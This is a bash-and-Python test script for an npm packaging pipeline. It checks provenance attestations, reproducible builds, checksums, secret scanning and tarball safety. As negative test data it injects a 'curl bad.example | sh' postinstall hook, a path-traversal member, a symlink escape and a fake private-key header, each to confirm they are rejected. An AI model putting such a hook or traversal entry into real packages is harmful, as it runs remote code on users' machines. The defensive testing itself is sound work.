#!/usr/bin/env bash
set -euo pipefail

usage() {
    printf 'usage: %s [VERSION]\n' "$0" >&2
}
if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
    usage
    exit 0
fi
if [[ $# -gt 1 ]]; then
    usage
    exit 2
fi

repository_directory=$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)
version=${1:-$(awk -F '"' '/^version = / { print $2; exit }' "$repository_directory/Cargo.toml")}
version=${version#v}
script_directory="$repository_directory/scripts"
for command in bash python3 npm; do
    command -v "$command" >/dev/null 2>&1 || {
        printf 'required npm test command is unavailable: %s\n' "$command" >&2
        exit 1
    }
done

work_directory=$(mktemp -d "${TMPDIR:-/tmp}/octet-npm-test.XXXXXX")
trap 'rm -rf "$work_directory"' EXIT
native_directory="$work_directory/native"
output_directory="$work_directory/npm"
repeat_directory="$work_directory/npm-repeat"
mkdir -p "$native_directory" "$work_directory/home" "$work_directory/tmp"
# No user npm configuration, registry traffic, lifecycle hooks or shared caches.
export HOME="$work_directory/home" TMPDIR="$work_directory/tmp"
export NPM_CONFIG_USERCONFIG="$HOME/.npmrc" NPM_CONFIG_GLOBALCONFIG="$HOME/.npm-globalrc"
export NPM_CONFIG_CACHE="$work_directory/cache" NPM_CONFIG_OFFLINE=true
export NPM_CONFIG_REGISTRY=http://127.0.0.1:9 NPM_CONFIG_IGNORE_SCRIPTS=true
export NPM_CONFIG_AUDIT=false NPM_CONFIG_FUND=false

python3 - "$native_directory" "$version" "$repository_directory/docs/package-assets.txt" <<'PY'
import gzip
import hashlib
import pathlib
import stat
import sys
import tarfile

native = pathlib.Path(sys.argv[1])
version = sys.argv[2]
targets = (
    "aarch64-apple-darwin",
    "x86_64-apple-darwin",
    "x86_64-unknown-linux-gnu",
)


def add_directory(archive, name):
    info = tarfile.TarInfo(name)
    info.type = tarfile.DIRTYPE
    info.mode = 0o755
    info.uid = info.gid = 0
    info.mtime = 0
    archive.addfile(info)


def add_file(archive, name, data, executable=False):
    info = tarfile.TarInfo(name)
    info.mode = 0o755 if executable else 0o644
    info.uid = info.gid = 0
    info.mtime = 0
    info.size = len(data)
    archive.addfile(info, __import__("io").BytesIO(data))

for target in targets:
    root = f"octet-{version}-{target}"
    archive_path = native / f"{root}.tar.gz"
    octet = f'''#!/bin/sh
set -eu
case "${{1-}}" in
  --version) printf '%s\\n' 'octet {version}' ;;
  --help) printf '%s\\n' 'fake octet help' ;;
  --probe) printf 'cwd=%s\\narg=%s\\nenv=%s\\n' "$(pwd -P)" "${{2-}}" "${{OCTET_NPM_TEST_ENV-}}" ;;
  --exit) exit "${{2:-23}}" ;;
  *) printf 'fake octet\\n' ;;
esac
'''.encode()
    host = f'''#!/bin/sh
set -eu
printf '%s\\n' '{{"protocol_version":1,"request_id":"npm-test","seq":1,"type":"hello","data":{{"sdk_version":"{version}"}}}}'
'''.encode()
    with archive_path.open("wb") as raw:
        with gzip.GzipFile(filename="", mode="wb", fileobj=raw, compresslevel=9, mtime=0) as compressed:
            with tarfile.open(fileobj=compressed, mode="w", format=tarfile.GNU_FORMAT) as archive:
                add_directory(archive, root)
                add_file(archive, f"{root}/octet", octet, executable=True)
                add_file(archive, f"{root}/octet-host", host, executable=True)
                add_file(archive, f"{root}/LICENSE", b"MIT License\\n")
                add_file(archive, f"{root}/README.md", b"# octet fixture\\n")
                for directory in ("docs", "examples", "sdk"):
                    add_directory(archive, f"{root}/{directory}")
                # Every inventoried path is represented; asset fixtures contain
                # binary bytes, and the empty Python module stays empty.
                for line in pathlib.Path(sys.argv[3]).read_text().splitlines():
                    if not line or line.startswith("#"):
                        continue
                    kind, name = line.split(" ", 1)
                    if name in {"README.md", "LICENSE"}:
                        continue
                    data = ("# Public fixture " + target + " " + name + "\n").encode()
                    if kind == "asset":
                        data += b"\x00\xff\x80binary fixture\r\n"
                    if name.endswith("/tests/__init__.py"):
                        data = b""
                    if name.endswith("/.gitignore"):
                        # Real npm must omit both this file and an inventoried
                        # evidence file matched by this nested ignore rule.
                        data = b"# fixture ignore rules\ndata/agent_tasks.jsonl\n"
                    add_file(archive, f"{root}/{name}", data)

lines = []
install = native / "install-octet.sh"
install.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
install.chmod(0o755)
for path in sorted(native.iterdir()):
    if path.name == "install-octet.sh" or path.suffix == ".gz":
        lines.append(f"{hashlib.sha256(path.read_bytes()).hexdigest()}  ./{path.name}")
(native / "OCTET_SHA256SUMS").write_text("\n".join(lines) + "\n", encoding="ascii")
PY

SOURCE_DATE_EPOCH=0 "$script_directory/package-octet-npm.sh" \
    "$version" \
    "$native_directory" \
    "$output_directory" \
    "$native_directory/OCTET_SHA256SUMS"
python3 "$script_directory/generate-octet-release-metadata.py" \
    "$version" \
    "v$version" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    "skaft-software/octet/.github/workflows/release-octet.yml@refs/tags/octet-binaries-v$version" \
    "skaft-software/octet" \
    "$native_directory/OCTET_SHA256SUMS" \
    "$native_directory/OCTET_RELEASE_METADATA.json" >/dev/null
python3 "$script_directory/create-octet-npm-manifest.py" \
    "$version" \
    "v$version" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    "$native_directory/OCTET_RELEASE_METADATA.json" \
    "$output_directory" \
    "$output_directory/OCTET_NPM_MANIFEST.json" \
    "$output_directory/OCTET_NPM_SHA256SUMS" >/dev/null
python3 "$script_directory/verify-octet-npm.py" "$version" "$output_directory" --json > "$work_directory/verification.json"
python3 - "$output_directory/octet-$version.tgz" "$work_directory/registry.json" "$work_directory/attestations.json" "$version" <<'PY'
import base64
import hashlib
import json
import pathlib
import sys

artifact, registry_output, attestations_output, version = sys.argv[1:]
source_commit = "0123456789abcdef0123456789abcdef01234567"
workflow_commit = "abcdef0123456789abcdef0123456789abcdef01"
integrity = "sha512-" + base64.b64encode(hashlib.sha512(pathlib.Path(artifact).read_bytes()).digest()).decode("ascii")
digest = hashlib.sha512(pathlib.Path(artifact).read_bytes()).hexdigest()
payload = {
    "_type": "https://in-toto.io/Statement/v1",
    "subject": [{
        "name": "pkg:npm/%40skaft%2Foctet@" + version,
        "digest": {"sha512": digest},
    }],
    "predicateType": "https://slsa.dev/provenance/v1",
    "predicate": {
        "buildDefinition": {
            "externalParameters": {
                "workflow": {
                    "repository": "https://github.com/skaft-software/octet",
                    "path": ".github/workflows/release-octet.yml",
                }
            },
            "resolvedDependencies": [{
                "uri": "git+https://github.com/skaft-software/octet@refs/tags/octet-binaries-v" + version,
                "digest": {"gitCommit": workflow_commit},
            }],
        }
    },
}
attestations = {
    "attestations": [{
        "predicateType": "https://slsa.dev/provenance/v1",
        "bundle": {
            "verificationMaterial": {},
            "dsseEnvelope": {
                "payload": base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode("ascii"),
                "signatures": [{"sig": "fixture"}],
            },
        },
    }]
}
registry = {
    "name": "@skaft/octet",
    "version": version,
    "dist": {
        "integrity": integrity,
        "attestations": {
            "url": "https://registry.npmjs.org/-/npm/v1/attestations/%40skaft%2Foctet@" + version,
            "provenance": {"predicateType": "https://slsa.dev/provenance/v1"},
        },
    },
}
pathlib.Path(registry_output).write_text(json.dumps(registry), encoding="utf-8")
pathlib.Path(attestations_output).write_text(json.dumps(attestations), encoding="utf-8")
PY
expected_integrity=$(python3 - "$output_directory/octet-$version.tgz" <<'PY'
import base64
import hashlib
import pathlib
import sys
print("sha512-" + base64.b64encode(hashlib.sha512(pathlib.Path(sys.argv[1]).read_bytes()).digest()).decode("ascii"))
PY
)
python3 "$script_directory/verify-octet-npm-provenance.py" \
    "$work_directory/registry.json" \
    "$work_directory/attestations.json" \
    "$output_directory/OCTET_NPM_MANIFEST.json" \
    "@skaft/octet" \
    "$version" \
    "$expected_integrity" \
    "https://github.com/skaft-software/octet" \
    ".github/workflows/release-octet.yml" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    > "$work_directory/provenance-verification.json"

# Attestation URLs must stay on the exact canonical registry endpoint.
cp "$work_directory/attestations.json" "$work_directory/valid-attestations.json"
python3 - "$work_directory/registry.json" "$work_directory/noncanonical-registry.json" <<'PY'
import json
import pathlib
import sys

source = json.loads(pathlib.Path(sys.argv[1]).read_text(encoding="utf-8"))
source["dist"]["attestations"]["url"] = source["dist"]["attestations"]["url"].replace(
    "/attestations/", "/attestations/unexpected/"
)
pathlib.Path(sys.argv[2]).write_text(json.dumps(source), encoding="utf-8")
PY
if python3 "$script_directory/verify-octet-npm-provenance.py" \
    "$work_directory/noncanonical-registry.json" \
    "$work_directory/valid-attestations.json" \
    "$output_directory/OCTET_NPM_MANIFEST.json" \
    "@skaft/octet" "$version" \
    "$expected_integrity" \
    "https://github.com/skaft-software/octet" \
    ".github/workflows/release-octet.yml" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    >/dev/null 2>&1; then
    printf 'provenance verifier accepted a non-canonical attestation URL\n' >&2
    exit 1
fi

# A provenance record that only claims presence but not the artifact digest is rejected.
python3 - "$work_directory/attestations.json" <<'PY'
import base64
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
envelope = value["attestations"][0]["bundle"]["dsseEnvelope"]
payload = json.loads(base64.b64decode(envelope["payload"]))
payload["subject"][0]["digest"]["sha512"] = "0" * 128
envelope["payload"] = base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode("ascii")
path.write_text(json.dumps(value), encoding="utf-8")
PY
if python3 "$script_directory/verify-octet-npm-provenance.py" \
    "$work_directory/registry.json" \
    "$work_directory/attestations.json" \
    "$output_directory/OCTET_NPM_MANIFEST.json" \
    "@skaft/octet" "$version" \
    "$expected_integrity" \
    "https://github.com/skaft-software/octet" \
    ".github/workflows/release-octet.yml" \
    "0123456789abcdef0123456789abcdef01234567" \
    "abcdef0123456789abcdef0123456789abcdef01" \
    >/dev/null 2>&1; then
    printf 'provenance verifier accepted a mismatched artifact binding\n' >&2
    exit 1
fi

# All inventory bytes must come from the matching native fixture, not checkout
# files or another architecture. Manifests/checksums bind the FINAL repaired tgz.
python3 - "$script_directory" "$native_directory" "$output_directory" "$work_directory" "$version" <<'PYDOCS'
import base64
import copy
import hashlib
import io
import json
import pathlib
import runpy
import subprocess
import sys
import tarfile

scripts, native, output, work = map(pathlib.Path, sys.argv[1:5])
version = sys.argv[5]
verification = runpy.run_path(str(scripts / "verify-octet-npm.py"))
files = verification["DOCUMENTATION_FILES"]
manifest = json.loads((output / "OCTET_NPM_MANIFEST.json").read_text())
for package in manifest["packages"]:
    data = (output / package["artifact"]).read_bytes()
    assert package["bytes"] == len(data)
    assert package["sha256"] == hashlib.sha256(data).hexdigest()
    assert package["sha512_integrity"] == "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
    if package["target"] == "launcher":
        continue
    root = f"octet-{version}-{package['target']}"
    with tarfile.open(native / (root + ".tar.gz")) as source, tarfile.open(output / package["artifact"]) as packed:
        for name in sorted(files):
            assert source.extractfile(root + "/" + name).read() == packed.extractfile("package/share/octet/" + name).read(), name
for line in (output / "OCTET_NPM_SHA256SUMS").read_text().splitlines():
    digest, name = line.split("  ./")
    assert hashlib.sha256((output / name).read_bytes()).hexdigest() == digest
print(f"native → npm: {len(files)} inventoried files match for all three targets; final artifact digests match")

expected = verification["expected_packages"](version)[1]
inspection = verification["inspect_tarball"](output / expected.artifact, expected)
stage = work / "packlist-reproduction"
for name, data in inspection.contents.items():
    path = stage / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    path.chmod(inspection.members["package/" + name].mode)
raw = work / "raw-npm"
raw.mkdir()
subprocess.run(["npm", "pack", "--ignore-scripts", "--pack-destination", str(raw)], cwd=stage, check=True, capture_output=True, timeout=30)
raw_path, = raw.glob("*.tgz")
raw_inspection = verification["inspect_tarball"](raw_path, expected)
benchmark = "docs/benchmarks/swe-bench-live-lite-v0.6.3/"
omitted = [benchmark + ".gitignore", benchmark + "data/agent_tasks.jsonl"]
for name in omitted:
    assert "share/octet/" + name not in raw_inspection.contents, name
    assert "share/octet/" + name in inspection.contents, name
assert "share/octet/docs/current-reference.md" in raw_inspection.contents
print("actual npm pack reproduced .gitignore + nested evidence omission; final packages retain both")

# The standalone verifier must reject ANY missing inventory asset, not just an
# extra reference or an otherwise empty docs/examples/sdk directory.
for name in sorted(files):
    damaged = copy.deepcopy(inspection)
    del damaged.contents["share/octet/" + name]
    try:
        verification["validate"](damaged, version)
    except verification["VerificationError"]:
        pass
    else:
        raise AssertionError("verifier accepted missing inventory file: " + name)

# The shared installed-byte check must reject both a changed ordinary doc and
# a same-size change to a binary asset (existence/size-only checks miss these).
for name in ["docs/current-reference.md", "docs/assets/octet/marks/favicon.ico"]:
    path = stage / "share/octet" / name
    original = path.read_bytes()
    path.write_bytes(bytes([original[0] ^ 1]) + original[1:])
    try:
        verification["check_documentation_bytes"](inspection, stage / "share/octet")
    except verification["VerificationError"] as error:
        assert "bytes differ" in str(error)
    else:
        raise AssertionError("byte comparison accepted altered asset: " + name)
    path.write_bytes(original)

# npm/pacote renames ignore metadata during ordinary installation. This is a
# named layout contract, not permission to skip missing/changed documentation.
doc_root = stage / "share/octet"
ignore = doc_root / benchmark / ".gitignore"
installed_ignore = ignore.with_name(".npmignore")
ignore_bytes = ignore.read_bytes()
assert not installed_ignore.exists()
ignore.rename(installed_ignore)
verification["check_documentation_bytes"](inspection, doc_root, npm_install=True)
for data in (None, ignore_bytes + b"changed"):
    installed_ignore.unlink()
    if data is not None:
        installed_ignore.write_bytes(data)
    try:
        verification["check_documentation_bytes"](inspection, doc_root, npm_install=True)
    except verification["VerificationError"]:
        pass
    else:
        raise AssertionError("npm metadata normalization hid a missing/changed asset")
    if installed_ignore.exists():
        installed_ignore.unlink()
    installed_ignore.write_bytes(ignore_bytes)
installed_ignore.rename(ignore)

# Exercise the exact private-stage restoration helper: it may add only missing
# inventoried docs, never overwrite changed bytes or launder unsafe npm entries.
helper = (scripts / "package-octet-npm.sh").read_text().split("<<'PYRESTORE'\n", 1)[1].split("\nPYRESTORE", 1)[0]
def restore(path):
    return subprocess.run([sys.executable, "-c", helper, str(scripts / "verify-octet-npm.py"), version,
                           str(path), expected.artifact, str(stage), "0"], capture_output=True, timeout=30)

result = restore(raw_path)
assert result.returncode == 0, result.stderr.decode()
verification["check_documentation_bytes"](verification["inspect_tarball"](raw_path, expected), stage / "share/octet")
for mutation, message in [("changed", b"npm changed inventoried documentation bytes"),
                          ("missing", b"is missing package/share/octet/docs/current-reference.md"),
                          ("link", b"link or special"), ("traversal", b"unsafe member path"),
                          ("unexpected", b"unexpected member"), ("duplicate", b"repeats member")]:
    path = work / (mutation + ".tgz")
    ordinary = "package/share/octet/docs/current-reference.md"
    with tarfile.open(path, "w:gz") as archive:
        for name, member in inspection.members.items():
            if mutation == "missing" and name == ordinary:
                continue
            data = inspection.contents.get(name.removeprefix("package/"))
            if mutation == "changed" and name == ordinary:
                data = bytes([data[0] ^ 1]) + data[1:]
            archive.addfile(member, io.BytesIO(data) if data is not None else None)
        if mutation in {"link", "traversal", "unexpected", "duplicate"}:
            name = {"link": "package/share/octet/docs/link", "traversal": "package/../escape",
                    "unexpected": "package/share/octet/extensions/octet-browse/extension.py", "duplicate": ordinary}[mutation]
            member = tarfile.TarInfo(name)
            member.mode = 0o644
            if mutation == "link":
                member.type = tarfile.SYMTYPE
                member.linkname = "/outside"
            archive.addfile(member)
    if mutation == "missing":
        try:
            verification["validate"](verification["inspect_tarball"](path, expected), version)
        except verification["VerificationError"] as error:
            assert message.decode() in str(error)
        else:
            raise AssertionError("standalone verifier accepted missing ordinary doc")
    else:
        result = restore(path)
        assert result.returncode != 0 and message in result.stderr, result.stderr.decode()

# Missing native docs cannot be repaired from this checkout. A secret in an
# ignored file still fails AFTER restoration; checksum/type gates remain intact.
archive_path = next(native.glob("*aarch64-apple-darwin.tar.gz"))
original = archive_path.read_bytes()
sums = native / "OCTET_SHA256SUMS"
original_sums = sums.read_bytes()
with tarfile.open(archive_path) as archive:
    members = archive.getmembers()
    contents = {member.name: archive.extractfile(member).read() for member in members if member.isfile()}
for mutation, message in [("missing", b"missing a required native or inventoried documentation file"),
                          ("secret", b"secret scanner found a match"), ("checksum", b"checksum does not match"),
                          ("link", b"link or special file")]:
    try:
        with tarfile.open(archive_path, "w:gz") as archive:
            for original_member in members:
                member = copy.copy(original_member)
                data = contents.get(member.name)
                if mutation == "missing" and member.name.endswith("/docs/current-reference.md"):
                    continue
                if mutation == "secret" and member.name.endswith("/.gitignore"):
                    data = b"-----BEGIN PRIVATE KEY-----\n"
                    member.size = len(data)
                if mutation == "link" and member.name.endswith("/docs/current-reference.md"):
                    member.type, member.linkname, member.size = tarfile.SYMTYPE, "/outside", 0
                    data = None
                archive.addfile(member, io.BytesIO(data) if data is not None else None)
        if mutation != "checksum":
            sums.write_text("\n".join(f"{hashlib.sha256((native / line.split('  ./')[1]).read_bytes()).hexdigest()}  ./{line.split('  ./')[1]}"
                                      for line in original_sums.decode().splitlines()) + "\n")
        result = subprocess.run([str(scripts / "package-octet-npm.sh"), version, str(native),
                                 str(work / ("bad-native-" + mutation)), str(sums)], capture_output=True, timeout=30)
        assert result.returncode != 0 and message in result.stderr, result.stderr.decode()
    finally:
        archive_path.write_bytes(original)
        sums.write_bytes(original_sums)
print("all missing-inventory, changed-byte, native/checksum, secret, and archive-boundary regressions passed")
PYDOCS

# Repacking the same immutable inputs with the same epoch must be byte-for-byte identical, not merely semantically equivalent.
SOURCE_DATE_EPOCH=0 "$script_directory/package-octet-npm.sh" \
    "$version" \
    "$native_directory" \
    "$repeat_directory" \
    "$native_directory/OCTET_SHA256SUMS" >/dev/null
for artifact in "$output_directory"/*.tgz; do
    name=${artifact##*/}
    cmp "$artifact" "$repeat_directory/$name"
done

# A lifecycle hook is rejected even if it is the only changed package field.
cp "$output_directory/octet-$version.tgz" "$work_directory/launcher-original.tgz"
python3 - "$output_directory/octet-$version.tgz" <<'PY'
import io
import json
import pathlib
import sys
import tarfile

path = pathlib.Path(sys.argv[1])
with tarfile.open(path, "r:gz") as source:
    members = source.getmembers()
    payload = {}
    for member in members:
        if member.isreg():
            stream = source.extractfile(member)
            assert stream is not None
            payload[member.name] = stream.read()
with tarfile.open(path, "w:gz") as destination:
    for member in members:
        if member.name == "package/package.json":
            manifest = json.loads(payload[member.name].decode("utf-8"))
            manifest["scripts"] = {"postinstall": "curl bad.example | sh"}
            data = json.dumps(manifest, sort_keys=True).encode("utf-8")
            member = tarfile.TarInfo(member.name)
            member.mode = 0o644
            member.size = len(data)
            member.mtime = 0
            destination.addfile(member, io.BytesIO(data))
        elif member.isreg():
            destination.addfile(member, io.BytesIO(payload[member.name]))
        else:
            destination.addfile(member)
PY
if python3 "$script_directory/verify-octet-npm.py" "$version" "$output_directory" >/dev/null 2>&1; then
    printf 'verifier accepted a lifecycle hook\n' >&2
    exit 1
fi
mv "$work_directory/launcher-original.tgz" "$output_directory/octet-$version.tgz"

# Missing checksum metadata is a hard failure; packagers may not silently fall
# back to a checkout or mutable download.
if "$script_directory/package-octet-npm.sh" "$version" "$native_directory" "$work_directory/missing-output" "$work_directory/no-such-sums" >/dev/null 2>&1; then
    printf 'packager accepted missing immutable checksum metadata\n' >&2
    exit 1
fi

"$script_directory/test-octet-npm-install.sh" --fixture "$output_directory" "$version"
printf 'npm package and launcher tests passed for %s\n' "$version"
